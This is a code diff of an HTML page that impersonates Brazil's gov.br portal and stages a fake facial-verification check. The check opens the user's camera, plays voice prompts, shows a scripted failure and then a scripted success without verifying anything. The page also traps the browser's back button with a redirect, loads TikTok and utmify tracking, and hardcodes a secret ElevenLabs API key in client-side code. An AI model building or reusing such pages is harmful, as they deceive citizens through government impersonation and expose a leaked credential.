@@ -12,21 +12,14 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 </script>
 <!-- TikTok Pixel Code End -->
 
-  <script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async defer></script>
   <script>
-  window.tikTokPixelId = "69b78d959dcfda60eb53f101";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
-  document.head.appendChild(a);
-</script>
+    window.tikTokPixelId = "69b78d959dcfda60eb53f101";
+    var a = document.createElement("script");
+    a.setAttribute("async",""); a.setAttribute("defer","");
+    a.setAttribute("src","https://cdn.utmify.com.br/scripts/pixel/pixel-tiktok.js");
+    document.head.appendChild(a);
+  </script>
 
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width,maximum-scale=1.0,user-scalable=no">
@@ -35,12 +28,13 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
   <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
   <script>
-    var urlBackRedirect = '../back.html'.trim() + ('./back.html'.indexOf("?") > 0 ? '&' : '?') + document.location.search.replace('?', '');
+    var urlBackRedirect = '../back.html'.trim() + ('./back.html'.indexOf("?") > 0 ? '&' : '?') + document.location.search.replace('?','');
     history.pushState({}, "", location.href);
     history.pushState({}, "", location.href);
-    window.onpopstate = function () { setTimeout(function () { location.href = urlBackRedirect; }, 1); };
+    window.onpopstate = function(){ setTimeout(function(){ location.href = urlBackRedirect; }, 1); };
   </script>
   <link rel="stylesheet" href="css/all.min.css">
+
   <style>
     :root {
       --gov-blue-primary: #1351B4;
@@ -48,345 +42,194 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       --gov-blue-light: #E8F4FD;
       --gov-blue-dark: #0C326F;
       --gov-green: #168821;
-      --gov-orange: #FF7A00;
       --gov-gray-light: #F8F9FA;
       --gov-gray-medium: #E5E5E5;
       --gov-gray-dark: #495057;
       --gov-white: #FFFFFF;
-      --gov-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-      --gov-shadow-hover: 0 4px 12px rgba(0, 0, 0, 0.15);
+      --gov-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      --gov-shadow-hover: 0 4px 12px rgba(0,0,0,0.15);
       --border-radius: 8px;
       --transition: all 0.3s ease;
     }
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    html, body { height: 100%; overflow-x: hidden; }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    html, body { height:100%; overflow-x:hidden; }
     body {
-      font-family: 'Inter', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-      background: #ffffff;
-      min-height: 100vh;
-      color: var(--gov-gray-dark);
-      line-height: 1.6;
-      display: flex;
-      flex-direction: column;
-      font-feature-settings: 'kern' 1, 'liga' 1;
-      -webkit-font-smoothing: antialiased;
-      -moz-osx-font-smoothing: grayscale;
+      font-family:'Inter','Source Sans Pro',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+      background:#fff; min-height:100vh; color:var(--gov-gray-dark);
+      line-height:1.6; display:flex; flex-direction:column;
+      -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale;
     }
 
     /* LOADING */
     #loading-screen {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: var(--gov-white);
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 16px;
-      z-index: 9999;
+      position:fixed; inset:0; background:#fff;
+      display:flex; flex-direction:column; align-items:center; justify-content:center;
+      z-index:9999;
     }
-    #loading-screen.hidden { display: none !important; }
-    #loading-screen p { font-size: 13px; color: #90a4ae; }
+    #loading-screen.hidden { display:none !important; }
 
-    /* HEADER — idêntico ao consulta.html original */
+    /* HEADER */
     header {
-      background: var(--gov-white);
-      padding: 16px 24px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      box-shadow: var(--gov-shadow);
-      position: sticky;
-      top: 0;
-      z-index: 1000;
-      border-bottom: 3px solid var(--gov-blue-primary);
+      background:var(--gov-white); padding:16px 24px;
+      display:flex; justify-content:space-between; align-items:center;
+      box-shadow:var(--gov-shadow); position:sticky; top:0; z-index:1000;
+      border-bottom:3px solid var(--gov-blue-primary);
     }
-    header .logo {
-      display: flex;
-      align-items: center;
-    }
-    header .logo img {
-      height: 40px;
-      width: auto;
-      filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
-    }
-    header .icons {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-    header .icons button {
-      background: none;
-      border: none;
-      padding: 8px;
-      cursor: pointer;
-      transition: var(--transition);
-      color: var(--gov-blue-primary);
-    }
-    header .icons button:hover {
-      background: var(--gov-blue-light);
-      transform: translateY(-1px);
-    }
-    header .icons button i {
-      font-size: 16px;
-    }
-    header .user {
-      background-color: #1451b4;
-      color: #fff;
-      border: none;
-      border-radius: 50px;
-      padding: 6px 16px;
-      display: flex;
-      align-items: center;
-      cursor: pointer;
-    }
-    header .user i {
-      margin-right: 8px;
-    }
+    header .logo { display:flex; align-items:center; }
+    header .logo img { height:40px; width:auto; filter:drop-shadow(0 2px 4px rgba(0,0,0,0.1)); }
+    header .icons { display:flex; align-items:center; gap:12px; }
+    header .icons button { background:none; border:none; padding:8px; cursor:pointer; transition:var(--transition); color:var(--gov-blue-primary); }
+    header .icons button:hover { background:var(--gov-blue-light); transform:translateY(-1px); }
+    header .icons button i { font-size:16px; }
+    header .user { background-color:#1451b4; color:#fff; border:none; border-radius:50px; padding:6px 16px; display:flex; align-items:center; cursor:pointer; }
+    header .user i { margin-right:8px; }
 
-    /* NAV — idêntico ao consulta.html original */
+    /* NAV */
     nav {
-      background: var(--gov-white);
-      padding: 12px 24px;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      border-bottom: 1px solid var(--gov-gray-medium);
-      position: sticky;
-      top: 79px;
-      z-index: 999;
+      background:var(--gov-white); padding:12px 24px;
+      display:flex; justify-content:space-between; align-items:center;
+      border-bottom:1px solid var(--gov-gray-medium);
+      position:sticky; top:79px; z-index:999;
     }
-    nav button {
-      background: none;
-      border: none;
-      display: flex;
-      align-items: center;
-      cursor: pointer;
-      padding: 8px 12px;
-      border-radius: var(--border-radius);
-      transition: var(--transition);
-    }
-    nav button:hover { background: var(--gov-gray-light); }
-    nav button i {
-      font-size: 16px;
-      color: var(--gov-blue-primary);
-      margin-right: 8px;
-    }
-    nav button p {
-      color: var(--gov-gray-dark);
-      font-size: 14px;
-      font-weight: 400;
-      margin: 0;
-    }
-    nav button span {
-      color: var(--gov-blue-primary);
-      font-weight: 500;
-    }
+    nav button { background:none; border:none; display:flex; align-items:center; cursor:pointer; padding:8px 12px; border-radius:var(--border-radius); transition:var(--transition); }
+    nav button:hover { background:var(--gov-gray-light); }
+    nav button i { font-size:16px; color:var(--gov-blue-primary); margin-right:8px; }
+    nav button p { color:var(--gov-gray-dark); font-size:14px; font-weight:400; margin:0; }
+    nav button span { color:var(--gov-blue-primary); font-weight:500; }
 
     /* MAIN */
     #main-content {
-      padding: 0 24px;
-      max-width: 720px;
-      flex: 1 0 auto;
-      padding-bottom: 60px;
-      margin: 0 auto;
-      width: 100%;
+      padding:0 24px 80px; max-width:720px;
+      flex:1 0 auto; margin:0 auto; width:100%;
     }
-    #main-content.hidden { display: none; }
+    #main-content.hidden { display:none; }
 
-    .cam-title { font-size: 18px; font-weight: 700; color: #111; margin-top: 20px; margin-bottom: 2px; }
-    .cam-sub   { font-size: 13px; color: #78909c; margin-bottom: 16px; }
+    .cam-title { font-size:18px; font-weight:700; color:#111; margin-top:20px; margin-bottom:2px; }
+    .cam-sub   { font-size:13px; color:#78909c; margin-bottom:16px; }
 
-    /* PILL ESTILO GOV.BR */
+    /* PILL */
     .gov-pill {
-      display: none;
-      margin: 0 auto 16px auto;
-      background: #2196F3;
-      color: #fff;
-      font-size: 15px;
-      font-weight: 500;
-      padding: 10px 32px;
-      border-radius: 50px;
-      text-align: center;
-      width: fit-content;
-      max-width: 92%;
-      box-shadow: 0 2px 10px rgba(33,150,243,.22);
+      display:none; margin:0 auto 16px auto;
+      background:#2196F3; color:#fff;
+      font-size:15px; font-weight:500;
+      padding:10px 32px; border-radius:50px;
+      text-align:center; width:fit-content; max-width:92%;
+      box-shadow:0 2px 10px rgba(33,150,243,.22);
     }
-    .gov-pill.show { display: block; animation: fadeIn .2s ease; }
-    .gov-pill.err  { background: #e53935; }
-    .gov-pill.ok   { background: #2e7d32; }
+    .gov-pill.show { display:block; animation:fadeIn .2s ease; }
+    .gov-pill.err  { background:#e53935; }
+    .gov-pill.ok   { background:#2e7d32; }
 
-    /* ÍCONES INFERIORES — câmera e som */
-    .bottom-icons {
-      display: none;
-      position: fixed;
-      bottom: 80px; /* acima do footer */
-      right: 24px;
-      align-items: flex-end;
-      gap: 28px;
-      z-index: 1001;
-    }
-    .bottom-icons.show { display: flex; }
-    .bottom-icon {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 5px;
-      cursor: pointer;
-      background: none;
-      border: none;
-    }
-    .bottom-icon .icon-circle {
-      width: 48px;
-      height: 48px;
-      border-radius: 50%;
-      background: #f0f4ff;
-      border: 1.5px solid #dce8ff;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      box-shadow: 0 2px 8px rgba(0,0,0,.12);
-    }
-    .bottom-icon .icon-circle i {
-      font-size: 22px;
-      color: #1351B4;
-    }
-    .bottom-icon span {
-      font-size: 11px;
-      color: #1351B4;
-      font-weight: 500;
-    }
-    .bottom-icon.muted .icon-circle i { color: #90a4ae; }
-    .bottom-icon.muted span { color: #90a4ae; }
-
-    /* CARD CÂMERA — sem box, oval direto na página */
-    .cam-card {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
+    /* CARD */
+    .cam-card { display:flex; flex-direction:column; align-items:center; }
 
     /* OVAL */
     .oval-wrap {
-      position: relative;
-      width: 80%;
-      aspect-ratio: 4/5;
-      border-radius: 50%;
-      overflow: hidden;
-      border: 4px solid #1565C0;
-      background: #cfd8dc;
-      transition: border-color .4s, box-shadow .4s;
+      position:relative; width:80%; aspect-ratio:4/5;
+      border-radius:50%; overflow:hidden;
+      border:4px solid #1565C0; background:#cfd8dc;
+      transition:border-color .4s, box-shadow .4s;
     }
-    .oval-wrap.idle     { border-color: #1565C0; animation: idlePulse 2.5s ease-in-out infinite; }
-    .oval-wrap.capturing{ border-color: #1565C0; box-shadow: 0 0 0 5px rgba(21,101,192,.15); animation: none; }
-    .oval-wrap.error    { border-color: #b71c1c; box-shadow: 0 0 0 6px rgba(183,28,28,.15); animation: shake .45s ease; }
-    .oval-wrap.success  { border-color: #2e7d32; box-shadow: 0 0 0 6px rgba(46,125,50,.18); animation: none; }
-
+    .oval-wrap.idle      { border-color:#1565C0; animation:idlePulse 2.5s ease-in-out infinite; }
+    .oval-wrap.capturing { border-color:#1565C0; box-shadow:0 0 0 5px rgba(21,101,192,.15); animation:none; }
+    .oval-wrap.error     { border-color:#b71c1c; box-shadow:0 0 0 6px rgba(183,28,28,.15); animation:shake .45s ease; }
+    .oval-wrap.success   { border-color:#2e7d32; box-shadow:0 0 0 6px rgba(46,125,50,.18); animation:none; }
     @keyframes idlePulse {
-      0%,100% { box-shadow: 0 0 0 3px rgba(21,101,192,.15); }
-      50%     { box-shadow: 0 0 0 9px rgba(21,101,192,.04); }
+      0%,100%{ box-shadow:0 0 0 3px rgba(21,101,192,.15); }
+      50%    { box-shadow:0 0 0 9px rgba(21,101,192,.04); }
     }
     @keyframes shake {
-      0%,100% { transform: translateX(0); }
-      20% { transform: translateX(-7px); }
-      40% { transform: translateX(7px); }
-      60% { transform: translateX(-4px); }
-      80% { transform: translateX(4px); }
+      0%,100%{ transform:translateX(0); }
+      20%{ transform:translateX(-7px); } 40%{ transform:translateX(7px); }
+      60%{ transform:translateX(-4px); } 80%{ transform:translateX(4px); }
     }
 
-    /* VÍDEO — sem botão de play nativo no iOS/Android */
+    /* VÍDEO */
     #cam-video {
-      position: absolute;
-      inset: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      transform: scaleX(-1); /* espelho frontal */
-      display: none;
-      pointer-events: none; /* bloqueia toque que ativa controles */
+      position:absolute; inset:0; width:100%; height:100%;
+      object-fit:cover; transform:scaleX(-1);
+      display:none; pointer-events:none;
     }
-    /* remove todos os controles nativos webkit */
     #cam-video::-webkit-media-controls,
     #cam-video::-webkit-media-controls-enclosure,
     #cam-video::-webkit-media-controls-panel,
     #cam-video::-webkit-media-controls-overlay-play-button,
     #cam-video::-webkit-media-controls-play-button,
     #cam-video::-webkit-media-controls-start-playback-button {
-      display: none !important;
-      -webkit-appearance: none;
+      display:none !important; -webkit-appearance:none;
     }
 
     /* PLACEHOLDER */
     .cam-ph {
-      position: absolute;
-      inset: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      background: #cfd8dc;
+      position:absolute; inset:0; display:flex; flex-direction:column;
+      align-items:center; justify-content:center; gap:10px; background:#cfd8dc;
     }
-    .cam-ph i { font-size: 52px; color: rgba(0,0,0,.15); }
-    .cam-ph p { font-size: 12px; color: rgba(0,0,0,.32); text-align: center; padding: 0 20px; line-height: 1.5; }
+    .cam-ph i { font-size:52px; color:rgba(0,0,0,.15); }
+    .cam-ph p { font-size:12px; color:rgba(0,0,0,.32); text-align:center; padding:0 20px; line-height:1.5; }
 
     /* OVERLAYS */
     .err-overlay, .suc-overlay {
-      position: absolute;
-      inset: 0;
-      display: none;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      z-index: 20;
-      color: #fff;
-      text-align: center;
-      padding: 24px;
+      position:absolute; inset:0; display:none; flex-direction:column;
+      align-items:center; justify-content:center; gap:10px; z-index:20;
+      color:#fff; text-align:center; padding:24px;
     }
-    .err-overlay { background: rgba(183,28,28,.92); }
-    .suc-overlay { background: rgba(27,94,32,.90); }
-    .err-overlay.show, .suc-overlay.show { display: flex; animation: fadeIn .3s ease; }
-    .err-overlay i, .suc-overlay i { font-size: 44px; }
-    .err-overlay h3, .suc-overlay h3 { font-size: 16px; font-weight: 700; margin: 0; }
-    .err-overlay p, .suc-overlay p { font-size: 12px; opacity: .9; margin: 0; line-height: 1.4; }
+    .err-overlay { background:rgba(183,28,28,.92); }
+    .suc-overlay { background:rgba(27,94,32,.90); }
+    .err-overlay.show, .suc-overlay.show { display:flex; animation:fadeIn .3s ease; }
+    .err-overlay i, .suc-overlay i { font-size:44px; }
+    .err-overlay h3, .suc-overlay h3 { font-size:16px; font-weight:700; margin:0; }
+    .err-overlay p,  .suc-overlay p  { font-size:12px; opacity:.9; margin:0; line-height:1.4; }
 
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    @keyframes fadeIn { from{opacity:0} to{opacity:1} }
+
+    /* ÍCONES INFERIORES */
+    .bottom-icons {
+      display:none; position:fixed; bottom:80px; right:24px;
+      align-items:flex-end; gap:28px; z-index:1001;
+    }
+    .bottom-icons.show { display:flex; }
+    .bottom-icon {
+      display:flex; flex-direction:column; align-items:center;
+      gap:5px; cursor:pointer; background:none; border:none;
+    }
+    .bottom-icon .icon-circle {
+      width:48px; height:48px; border-radius:50%;
+      background:#f0f4ff; border:1.5px solid #dce8ff;
+      display:flex; align-items:center; justify-content:center;
+      box-shadow:0 2px 8px rgba(0,0,0,.12);
+    }
+    .bottom-icon span { font-size:11px; color:#1351B4; font-weight:500; }
+    .bottom-icon.muted span { color:#90a4ae; }
+    .bottom-icon.muted .icon-circle { border-color:#e0e0e0; background:#f5f5f5; }
 
     /* FOOTER */
     footer {
-      background: linear-gradient(135deg, var(--gov-blue-dark), #0B1A38);
-      color: var(--gov-white);
-      text-align: center;
-      padding: 16px;
-      font-size: 14px;
-      flex-shrink: 0;
+      background:linear-gradient(135deg,var(--gov-blue-dark),#0B1A38);
+      color:#fff; text-align:center; padding:16px; font-size:14px; flex-shrink:0;
     }
-    @media (max-width: 768px) {
-      header { padding: 12px 16px; }
-      header .logo img { height: 32px; }
-      #main-content { padding: 0 16px 60px; }
+    @media(max-width:768px){
+      header{ padding:12px 16px; } header .logo img{ height:32px; }
+      #main-content{ padding:0 16px 80px; }
     }
   </style>
 </head>
 <body>
 
   <div id="loading-screen">
-    <img src="images/govbr.png" style="width: 140px; margin: 10px;">
+    <img src="images/govbr.png" style="width:140px;margin:10px;">
   </div>
 
   <header>
     <div class="logo">
-      <img src="images/govbr.png" style="width: 90px; margin: 10px;">
+      <img src="images/govbr.png" style="width:90px;margin:10px;">
     </div>
     <div class="icons">
       <button><i class="fas fa-ellipsis-v"></i></button>
       <button><i class="fas fa-cookie-bite"></i></button>
       <button><i class="fas fa-th"></i></button>
-      <button class="user" id="user-button" style="background-color: #1451b4;">
-        <i class="fas fa-user" style="color: #fff;"></i>
-        <span id="header-user-name" style="color: #fff;">Usuário</span>
+      <button class="user" id="user-button" style="background-color:#1451b4;">
+        <i class="fas fa-user" style="color:#fff;"></i>
+        <span id="header-user-name" style="color:#fff;">Usuário</span>
       </button>
     </div>
   </header>
@@ -409,14 +252,8 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     <div class="cam-card">
       <div class="oval-wrap idle" id="oval-wrap">
 
-        <!-- sem controls, sem playsinline para não mostrar play, pointer-events none -->
-        <video id="cam-video"
-          autoplay
-          muted
-          playsinline
-          disablePictureInPicture
-          webkit-playsinline
-          x-webkit-airplay="deny">
+        <video id="cam-video" autoplay muted playsinline
+          disablePictureInPicture webkit-playsinline x-webkit-airplay="deny">
         </video>
 
         <div class="cam-ph" id="cam-ph">
@@ -446,15 +283,15 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
   </main>
 
-  <!-- ícones inferiores direitos — câmera e som -->
+  <!-- ícones inferiores -->
   <div class="bottom-icons" id="bottom-icons">
-    <div class="bottom-icon" id="icon-camera" title="Trocar câmera">
+    <div class="bottom-icon" id="icon-camera">
       <div class="icon-circle">
         <img src="refresh_1829450.png" style="width:24px;height:24px;filter:invert(19%) sepia(90%) saturate(1200%) hue-rotate(200deg) brightness(90%) contrast(95%);">
       </div>
       <span>Câmera</span>
     </div>
-    <div class="bottom-icon" id="icon-som" title="Silenciar">
+    <div class="bottom-icon" id="icon-som">
       <div class="icon-circle">
         <img id="img-som" src="icon-som.png" style="width:26px;height:26px;">
       </div>
@@ -474,35 +311,35 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
     function formatarNome(n) {
       if (!n) return '';
-      return n.toLowerCase().split(' ').filter(p => p)
-        .map(p => p[0].toUpperCase() + p.slice(1)).join(' ');
+      return n.toLowerCase().split(' ').filter(p=>p)
+        .map(p => p[0].toUpperCase()+p.slice(1)).join(' ');
     }
     function formatarCPF(c) {
-      return c.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+      return c.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
     }
 
-    const $         = id => document.getElementById(id);
-    const elLoading = $('loading-screen');
-    const elMain    = $('main-content');
-    const elPill    = $('gov-pill');
-    const elOval    = $('oval-wrap');
-    const elVideo   = $('cam-video');
-    const elPh      = $('cam-ph');
-    const elErr     = $('err-overlay');
-    const elSuc     = $('suc-overlay');
-    const elHdrName = $('header-user-name');
+    const $ = id => document.getElementById(id);
 
-    let userData = null;
-    let stream   = null;
-
+    const elLoading     = $('loading-screen');
+    const elMain        = $('main-content');
+    const elPill        = $('gov-pill');
+    const elOval        = $('oval-wrap');
+    const elVideo       = $('cam-video');
+    const elPh          = $('cam-ph');
+    const elErr         = $('err-overlay');
+    const elSuc         = $('suc-overlay');
+    const elHdrName     = $('header-user-name');
     const elBottomIcons = $('bottom-icons');
     const elIconCamera  = $('icon-camera');
     const elIconSom     = $('icon-som');
 
-    let somMutado  = false;
+    let userData   = null;
+    let stream     = null;
     let facingMode = 'user';
+    let somMutado  = false;
+    let audioAtual = null;
 
-    // ── Trocar câmera (frontal ↔ traseira) ──
+    // ── Trocar câmera ──
     elIconCamera.addEventListener('click', async () => {
       if (!stream) return;
       facingMode = facingMode === 'user' ? 'environment' : 'user';
@@ -510,80 +347,75 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       stream = null;
       try {
         stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
-          audio: false
+          video:{ facingMode, width:{ideal:1280}, height:{ideal:720} }, audio:false
         });
         elVideo.srcObject = stream;
-      } catch (e) { console.error(e); }
+      } catch(e){ console.error(e); }
     });
 
-    // ── Mutar / desmutar som ──
+    // ── Mutar som ──
     elIconSom.addEventListener('click', () => {
       somMutado = !somMutado;
-      if (somMutado) {
-        elIconSom.classList.add('muted');
-        silenciar();
-      } else {
-        elIconSom.classList.remove('muted');
-      }
+      elIconSom.classList.toggle('muted', somMutado);
+      if (somMutado) silenciar();
     });
 
     // ── Pill ──
     function pill(txt, cls) {
       elPill.textContent = txt;
-      elPill.className   = 'gov-pill show' + (cls ? ' ' + cls : '');
+      elPill.className   = 'gov-pill show' + (cls ? ' '+cls : '');
     }
     function hidePill() { elPill.className = 'gov-pill'; }
 
     // ════════════════════════════════════════
-    //  VOZ — ElevenLabs neural pt-BR feminina
+    //  VOZ — ElevenLabs com timeout de 4s
+    //  Se demorar ou falhar → Web Speech API
     // ════════════════════════════════════════
     const ELEVEN_KEY   = 'sk_c1b8fd45dd09df89ac15406e1b577d53b82bc465469f5f65';
-    const ELEVEN_VOICE = '21m00Tcm4TlvDq8ikWAM'; // Rachel — feminina natural
+    const ELEVEN_VOICE = '21m00Tcm4TlvDq8ikWAM';
 
-    async function falarElevenLabs(texto) {
-      const resp = await fetch(
-        `https://api.elevenlabs.io/v1/text-to-speech/${ELEVEN_VOICE}`, {
-        method: 'POST',
-        headers: {
-          'xi-api-key':   ELEVEN_KEY,
-          'Content-Type': 'application/json',
-          'Accept':       'audio/mpeg'
-        },
-        body: JSON.stringify({
-          text: texto,
-          model_id: 'eleven_multilingual_v2',
-          voice_settings: {
-            stability:        0.50,
-            similarity_boost: 0.85,
-            style:            0.20,
-            use_speaker_boost: true
-          }
+    function falarElevenLabs(texto) {
+      return new Promise((resolve, reject) => {
+        // timeout de 4s — se ElevenLabs não responder, usa fallback
+        const timer = setTimeout(() => reject(new Error('timeout')), 4000);
+
+        fetch(`https://api.elevenlabs.io/v1/text-to-speech/${ELEVEN_VOICE}`, {
+          method: 'POST',
+          headers: {
+            'xi-api-key':   ELEVEN_KEY,
+            'Content-Type': 'application/json',
+            'Accept':       'audio/mpeg'
+          },
+          body: JSON.stringify({
+            text: texto,
+            model_id: 'eleven_multilingual_v2',
+            voice_settings: { stability:0.50, similarity_boost:0.85, style:0.20, use_speaker_boost:true }
+          })
         })
-      });
-      if (!resp.ok) throw new Error('eleven_error');
-      const blob = await resp.blob();
-      const url  = URL.createObjectURL(blob);
-      return new Promise(resolve => {
-        const a = new Audio(url);
-        a.onended = () => { URL.revokeObjectURL(url); resolve(); };
-        a.onerror = () => { URL.revokeObjectURL(url); resolve(); };
-        a.play().catch(resolve);
+        .then(r => { if(!r.ok) throw new Error('err'); return r.blob(); })
+        .then(blob => {
+          clearTimeout(timer);
+          const url = URL.createObjectURL(blob);
+          if (audioAtual) { audioAtual.pause(); }
+          audioAtual = new Audio(url);
+          audioAtual.onended = () => { URL.revokeObjectURL(url); resolve(); };
+          audioAtual.onerror = () => { URL.revokeObjectURL(url); resolve(); };
+          audioAtual.play().catch(resolve);
+        })
+        .catch(e => { clearTimeout(timer); reject(e); });
       });
     }
 
-    // Fallback: Web Speech API com melhor voz pt-BR
+    // Fallback: Web Speech API
     function falarNativo(texto) {
       return new Promise(resolve => {
         if (!window.speechSynthesis) { resolve(); return; }
         window.speechSynthesis.cancel();
-        const u = new SpeechSynthesisUtterance(texto);
-        u.lang  = 'pt-BR';
-        u.rate  = 0.90;
-        u.pitch = 1.2;
+        const u  = new SpeechSynthesisUtterance(texto);
+        u.lang   = 'pt-BR'; u.rate = 0.90; u.pitch = 1.2; u.volume = 1;
         const vz = window.speechSynthesis.getVoices();
-        const v  = vz.find(x => /google/i.test(x.name) && x.lang === 'pt-BR')
-                || vz.find(x => x.lang === 'pt-BR')
+        const v  = vz.find(x => /google/i.test(x.name) && x.lang==='pt-BR')
+                || vz.find(x => x.lang==='pt-BR')
                 || vz.find(x => x.lang.startsWith('pt'));
         if (v) u.voice = v;
         const ki = setInterval(() => {
@@ -595,26 +427,30 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       });
     }
 
+    // Tenta ElevenLabs; se falhar/timeout usa Web Speech
     async function falar(texto) {
+      if (somMutado) return; // som desligado → pula
       try {
         await falarElevenLabs(texto);
-      } catch (e) {
+      } catch(e) {
         await falarNativo(texto);
       }
     }
 
     function silenciar() {
+      if (audioAtual) { audioAtual.pause(); audioAtual.currentTime = 0; }
       if (window.speechSynthesis) window.speechSynthesis.cancel();
     }
 
-    async function dizer(texto, cls) {
-      pill(texto, cls);
-      await falar(texto);
+    // Mostra pill E fala — NÃO espera a voz terminar para continuar o fluxo
+    // A voz roda em paralelo, o fluxo segue pelos delays
+    function dizer(txt, cls) {
+      pill(txt, cls);
+      falar(txt); // sem await — não trava o fluxo
     }
 
     // ── Câmera ──
     async function abrirCamera() {
-      // se já tem stream ativo, só reconecta o vídeo sem pedir permissão de novo
       if (stream && stream.active) {
         elVideo.srcObject     = stream;
         elVideo.style.display = 'block';
@@ -624,21 +460,18 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
       }
       try {
         stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
-          audio: false
+          video:{ facingMode, width:{ideal:1280}, height:{ideal:720} }, audio:false
         });
         elVideo.srcObject     = stream;
         elVideo.style.display = 'block';
         elPh.style.display    = 'none';
         elBottomIcons.classList.add('show');
-      } catch (e) {
+      } catch(e) {
         elVideo.style.display = 'none';
       }
     }
 
-    function esconderVideo() {
-      elVideo.style.display = 'none';
-    }
+    function esconderVideo() { elVideo.style.display = 'none'; }
 
     function fecharCamera() {
       if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
@@ -665,64 +498,62 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
 
     // ════════════════════════════════════════
     //  FLUXO PRINCIPAL
+    //  dizer() não bloqueia — voz roda em paralelo
+    //  delays controlam o ritmo visual
     // ════════════════════════════════════════
     async function iniciar() {
-      resetVisual();
-      hidePill();
+      resetVisual(); hidePill();
 
-      /* 1 — abre câmera */
       await abrirCamera();
-      await delay(500);
+      await delay(800);
 
-      /* 2 — instrução 1 */
-      await dizer('Posicione seu rosto na altura dos olhos.');
-      await delay(300);
+      dizer('Posicione seu rosto na altura dos olhos.');
+      await delay(3500);
 
-      /* 3 — instrução 2 */
       elOval.className = 'oval-wrap capturing';
-      await dizer('Centralize seu rosto dentro do círculo.');
-      await delay(300);
+      dizer('Centralize seu rosto dentro do círculo.');
+      await delay(3500);
 
-      /* 4 — instrução 3 */
-      await dizer('Por favor, aguarde.');
-      await delay(500);
+      dizer('Por favor, aguarde.');
+      await delay(3000);
 
-      /* ══ PRIMEIRA TENTATIVA → FALHA ══ */
+      /* ══ FALHA ══ */
       silenciar();
       elOval.className = 'oval-wrap error';
-      await delay(250);
+      await delay(300);
       elErr.classList.add('show');
-      await dizer('Não foi possível verificar. Vamos tentar novamente.', 'err');
-      await delay(500);
+      dizer('Não foi possível verificar. Vamos tentar novamente.', 'err');
+      await delay(4000);
 
       /* reset */
       elErr.classList.remove('show');
-      esconderVideo();          /* mantém stream ativo, só esconde */
-      resetVisual();
-      hidePill();
+      silenciar();
+      esconderVideo();
+      resetVisual(); hidePill();
       elPh.style.display = 'flex';
       elPh.innerHTML = `
         <i class="fas fa-spinner fa-spin" style="font-size:40px;color:rgba(0,0,0,.14);"></i>
         <p style="color:rgba(0,0,0,.28);font-size:12px;margin-top:8px;">Aguarde...</p>`;
-      await delay(1000);
+      await delay(1500);
 
       /* ══ SEGUNDA TENTATIVA → SUCESSO ══ */
       await abrirCamera();
-      await delay(400);
+      await delay(800);
 
       elOval.className = 'oval-wrap capturing';
-      await dizer('Por favor, mantenha o olhar diretamente para a câmera.');
-      await delay(300);
+      dizer('Por favor, mantenha o olhar diretamente para a câmera.');
+      await delay(3800);
 
-      await dizer('Por favor, aguarde.');
-      await delay(500);
+      dizer('Por favor, aguarde.');
+      await delay(3000);
 
       /* sucesso */
       silenciar();
       elOval.className = 'oval-wrap success';
       elSuc.classList.add('show');
